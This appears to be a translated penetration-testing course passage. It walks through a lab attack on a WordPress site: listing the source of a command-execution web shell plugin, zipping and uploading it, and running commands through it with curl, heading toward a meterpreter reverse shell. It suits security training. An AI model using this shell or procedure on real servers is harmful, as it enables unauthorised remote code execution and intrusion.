
一旦我们点击*登录*，就可以进入管理员仪表板。

![](img/ec25e59d75726b7041242a56d3376832_758_0.png)

*图 332：成功登录*

> 可能会出现请求验证管理员电子邮件地址的情况。如果是这种情况，只需点击“此电子邮件正确”即可继续。

既然我们已经登录，就可以继续我们的信息收集旅程，以发现下一步应该利用什么。

### 24.2.4 枚举管理界面

登录管理界面为进一步利用打开了大门。在我们开始探索提升当前访问权限的方法之前，让我们先调查一下 WordPress 提供的选项。

在 WordPress 中，一个很好的起点是*工具 > 站点健康*部分的*信息*选项卡。

![](img/ec25e59d75726b7041242a56d3376832_759_0.png)

*图 333。查看 WordPress 信息页面*

在此页面上，我们可以确定服务器正在使用 PHP 版本 7.0.33-0ubuntu0.16.04.7 运行 WordPress。我们还发现数据库正在 IP 地址 10.5.5.11 上运行，这与我们当前正在针对的目标不同。这并不罕见，因为数据库和 Web 应用程序通常运行在单独的服务器上。

既然我们已经收集了一些基本信息，就可以尝试提升我们的访问权限。拥有 WordPress 管理权限的一个便利之处是我们可以安装自己的插件。WordPress 中的插件是用 PHP 编写的，且限制较少。例如，我们可以上传一个包含 PHP 反向 Shell 或代码执行功能的插件。幸运的是，其他人已经为此目的创建了恶意插件。

其中一个这样的插件可以在 **seclists** 包中找到，可以通过 **apt** 在 Kali 中安装。

```
kali@kali:~$ sudo apt install seclists
Listing 873 - Installing the seclists package
```

安装完成后，seclists 目录可以在 `/usr/share/seclists` 中找到，而我们要找的文件可以在 **Web-Shells/WordPress** 中找到。

```
kali@kali:~$ cd /usr/share/seclists/Web-Shells/WordPress

kali@kali:/usr/share/seclists/Web-Shells/WordPress$ ls
bypass-login.php plugin-shell.php
Listing 874 - Listing seclists WordPress web shells
```

我们要找的具体文件是 **plugin-shell.php**。让我们快速检查一下它，看看它是做什么的。

```
1 <?php
2 /*
3 Plugin Name: Cheap & Nasty Wordpress Shell
4 Plugin URI: https://github.com/leonjza/wordpress-shell
5 Description: Execute Commands as the webserver you are serving wordpress with!
Shell will probably live at /wp-content/plugins/shell/shell.php. Commands can be given
using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/shell/shell.
php?cmd=id", should provide you with output such as <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>
Author: Leon Jacobs
Version: 0.3
Author URI: https://leonjza.github.io
9 */
Listing 875 - WordPress plugin shell comments
```

Listing 875 中的第 2-9 行是注释，对于 WordPress 识别该文件为插件是必需的。

```
11 # attempt to protect myself from deletion
12 $this_file = __FILE__;
13 @system("chmod ugo-w $this_file");
14 @system("chattr +i $this_file");
Listing 876 - Self deletion protection
```

第 12-14 行试图保护该文件不被系统删除。

```
19 # test if parameter 'cmd', 'ip' or 'port' is present. If not this will avoid an error on logs or on all pages if badly configured.
20 if( isset($_REQUEST[$cmd]) ) {
21
22 # grab the command we want to run from the 'cmd' GET or POST parameter (POST doesn't display the command on apache logs)
23 $command = $_REQUEST[$cmd];
24 executeCommand($command);
Listing 877 - Check for cmd parameter
```

第 20-24 行将尝试运行系统命令，如果 HTTP 请求中设置了 $cmd 变量。该插件将使用 *executeCommand* 函数来识别并执行适当的 PHP 内部 API，以在目标系统上运行命令。*executeCommand* 函数可以在第 47-82 行找到。

```
47   function executeCommand(string $command) {
48     
49       # Try to find a way to run our command using various PHP internals
50       if (class_exists('ReflectionFunction')) {
51       
52         # http://php.net/manual/en/class.reflectionfunction.php
53         $function = new ReflectionFunction('system');
54         $function->invoke($command);
55       
56     } elseif (function_exists('call_user_func_array')) {
57       
58         # http://php.net/manual/en/function.call-user-func-array.php
59         call_user_func_array('system', array($command));
60       
61     } elseif (function_exists('call_user_func')) {
62       
63         # http://php.net/manual/en/function.call-user-func.php
64         call_user_func('system', $command);
65       
66     } else if(function_exists('passthru')) {
67       
68         # https://www.php.net/manual/en/function.passthru.php
69         ob_start();
70         passthru($command , $return_var);
71         $output = ob_get_contents();
72         ob_end_clean();
73       
74     } else if(function_exists('system')){
75       
76         # this is the last resort. chances are PHP Suhosin
77         # has system() on a blacklist anyways :>
78       
79         # http://php.net/manual/en/function.system.php
80         system($command);
81       }
82   }
```

*Listing 878 - executeCommand function*

*plugin-shell.php* 插件是在系统上执行命令的催化剂。一旦我们能够在受 compromises 的主机上触发任意代码执行，就有许多方法可以获得完整的反向 Shell。

### 24.2.5 获取 Shell

为了获取 shell，我们首先必须以 WordPress 知道如何处理的方式对插件进行打包。WordPress 期望插件位于 zip 文件中。当 WordPress 接收到 zip 文件时，它会将其解压到服务器上的 **wp-content/plugins** 目录中。WordPress 将 zip 文件的内容放入一个与 zip 文件本身名称匹配的文件夹中。因此，我们需要记下文件的名称，以便稍后能够访问我们的 PHP Shell。

Listing 879 展示了 zip 文件的创建过程。

```
kali@kali:~$ cd /usr/share/seclists/Web-Shells/WordPress
kali@kali:/usr/share/seclists/Web-Shells/WordPress$ sudo zip plugin-shell.zip plugin-shell.php
adding: plugin-shell.php (deflated 58%)
```

Listing 879 - Creating zip package for web shell

生成的 zip 文件名为 **plugin-shell.zip**，并将放置在服务器上的 **wp-content/plugins** 中的 **plugin-shell** 文件夹内。

既然插件包已生成，是时候上传 shell 了。首先，我们需要点击左侧边栏上的 *插件* 链接，访问插件页面。

![](img/ec25e59d75726b7041242a56d3376832_762_0.png)

图 334：访问插件页面

接下来，我们通过点击左上角的 **Add New** 来安装插件。这将把我们带到“添加插件”页面。

![](img/ec25e59d75726b7041242a56d3376832_763_0.png)

*图 335。添加插件页面*

由于我们不是从 WordPress 插件目录下载插件，我们需要在页面的左上角选择 *上传插件*。

![](img/ec25e59d75726b7041242a56d3376832_764_0.png)

*图 336：上传插件对话框*

这将打开一个部分，我们可以选择我们的插件包。我们需要选择“浏览”，这将打开一个文件对话框，让我们找到创建好的包。

![](img/ec25e59d75726b7041242a56d3376832_765_0.png)

图 337：选择插件 zip 文件

在文件对话框打开后，我们导航到包含我们插件的目录，选择 **plugin-shell.zip** 文件，并点击文件对话框底部的“打开”。

最后，为了安装插件，我们点击 **Install Now**。

![](img/ec25e59d75726b7041242a56d3376832_766_0.png)

图 338：安装插件

安装插件将上传 zip 文件并解压其内容。

既然插件已安装，我们可以尝试使用它在 WordPress 目标上运行系统命令。为此，我们可以简单地使用 **cURL**。如前所述，插件的目录是 **wp-content/plugins**，zip 文件将被解压到一个名为 **plugin-shell** 的目录中，我们要针对的文件名为 **plugin-shell.php**。

请记住，我们还必须设置一个包含我们要在目标系统上执行的命令的 **cmd** 参数。让我们尝试运行 **whoami**，看看 shell 是否有效。

```
kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
www-data
```

Listing 880 - Running whoami

有效！根据 Listing 880 的输出，我们正在以 www-data 用户身份运行命令。现在是时候上传 meterpreter 载荷并获取完整的反向 Shell 了。

